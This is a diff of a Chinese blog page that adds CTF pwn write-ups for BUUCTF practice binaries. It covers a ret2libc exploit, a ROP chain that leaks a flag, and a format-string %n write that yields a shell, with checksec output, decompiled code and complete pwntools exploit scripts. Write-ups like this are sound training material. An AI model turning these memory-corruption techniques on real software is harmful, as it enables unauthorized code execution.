@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.ghostfoxy.cn/banner/5.png">
 <meta property="article:published_time" content="2025-11-25T05:44:39.000Z">
-<meta property="article:modified_time" content="2025-11-26T01:23:33.312Z">
+<meta property="article:modified_time" content="2025-12-01T15:05:02.221Z">
 <meta property="article:author" content="Gh0stF0xy">
 <meta property="article:tag" content="pwn,题解,write-up">
 <meta name="twitter:card" content="summary_large_image">
@@ -230,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          374 字
+          958 字
         
       </span>
     
@@ -241,7 +241,7 @@
         
         
         
-          4 分钟
+          8 分钟
         
       </span>
     
@@ -292,7 +292,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-11-26T09:23:33+08:00
+                    本文最后更新于 2025-12-01T23:05:02+08:00
                   
                   
 
@@ -325,6 +325,51 @@
 <p>另一种方法可以用ret2libc</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_n_5&#x27;</span>)<br>offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_addr = <span class="hljs-number">0x4004c9</span><br>pop_rdi = <span class="hljs-number">0x400713</span><br>main_addr = <span class="hljs-number">0x400636</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;tell me your name\n&#x27;</span>,<span class="hljs-string">b&#x27;name&#x27;</span>)<br>payload1 = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(puts_got_addr) + p64(ret_addr) + p64(puts_plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">b&#x27;What do you want to say to me?\n&#x27;</span>,payload1)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload2 = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">b&#x27;tell me your name\n&#x27;</span>,<span class="hljs-string">b&#x27;name&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;What do you want to say to me?\n&#x27;</span>,payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<p>执行程序拿到flag</p>
+<h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>checksec一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>32位程序，NX开启</p>
+<p>查看源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  _BYTE v4[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [esp+Fh] [ebp-2Dh] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>危险函数gets存在，所以利用思路是栈溢出</p>
+<p>还存在另外一个有用的函数get_secret：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">get_secret</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br><br>  v0 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);<br>  fgets(&amp;fl4g, <span class="hljs-number">45</span>, v0);<br>  <span class="hljs-keyword">return</span> fclose(v0);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>函数作用是将flag.txt的内容存入fl4g变量，但并没有输出。手动构造ROP</p>
+<p>查看汇编，发现main函数没有把ebp压入栈中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080489E0                 sub     esp, 3Ch<br>.text:080489E3                 mov     [esp+3Ch+var_3C], offset aB0r4V3rS37u4hO ; &quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;<br>.text:080489EA                 call    printf<br>.text:080489EF                 lea     eax, [esp+3Ch+var_2D]<br>.text:080489F3                 mov     [esp+3Ch+var_3C], eax<br>.text:080489F6                 call    gets<br>.text:080489FB                 xor     eax, eax<br>.text:080489FD                 add     esp, 3Ch<br>.text:08048A00                 retn<br>.text:08048A00 main            endp<br></code></pre></td></tr></table></figure>
+
+<p>偏移量：0x2D</p>
+<p>利用思路：填充缓冲区后跳转get_secret函数，执行完读取操作后，将返回的函数改成write函数并打印fl4g变量的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(get_secret_addr) + p32(write_addr) + p32(exit_addr) + p32(<span class="hljs-number">1</span>) + p32(fl4g_addr) + p32(<span class="hljs-number">45</span>)<br></code></pre></td></tr></table></figure>
+
+<p>完整构造exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28670</span>)<br>get_secret_addr = <span class="hljs-number">0x080489A0</span><br>write_addr = <span class="hljs-number">0x806e270</span><br>fl4g_addr = <span class="hljs-number">0x080ECA2D</span><br>offset = <span class="hljs-number">0x2D</span><br>exit_addr = <span class="hljs-number">0x804e660</span> <br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(get_secret_addr) + p32(write_addr) + p32(exit_addr) + p32(<span class="hljs-number">1</span>) + p32(fl4g_addr) + p32(<span class="hljs-number">45</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><p>checksec一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      Canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>32位程序，金丝雀开启，NX开启</p>
+<p>IDA查看源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  be_nice_to_people();<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50u</span>);<br>  <span class="hljs-built_in">printf</span>(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d!\n&quot;</span>, x);<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;running sh...&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一看就是格式化字符串漏洞。</p>
+<p>泄漏偏移：11</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fm<br>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p <span class="hljs-comment">#泄漏栈上的数据的地址</span><br>AAAA 0xffd97d2c 0x50 0xf7f2b000 0xf7ef2540 0xffffffff 0x8048034 0xffd97e44 0xf7f2b608 0x20 0x38 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070<br>3!<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，字符串AAAA在偏移量为11的位置的栈上的数据，被当作是地址的值解析并输出，所以我们的读写操作只能发生在栈上第11个位置。</p>
+<p>寻找变量x的地址：0x804a02c</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb fm<br>p &amp;x<br><span class="hljs-variable">$1</span> = (&lt;data variable, no debug info&gt; *) 0x804a02c &lt;x&gt;<br></code></pre></td></tr></table></figure>
+
+<p>构造payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p32(<span class="hljs-number">0x804a02c</span>) + <span class="hljs-string">b&#x27;%11$n&#x27;</span> <span class="hljs-comment">#%n是将已经输出的字符串字节长度作为一个整型变量写入到某一地址上，这里的0x804a02c长度是4，刚好符合条件</span><br></code></pre></td></tr></table></figure>
+
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29184</span>)<br>payload = p32(<span class="hljs-number">0x804a02c</span>) + <span class="hljs-string">b&#x27;%11$n&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行程序拿到shell</p>
 
                 
               </div>
@@ -403,7 +448,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年11月26日</div>
+          <div>2025年12月1日</div>
         </div>
       
       
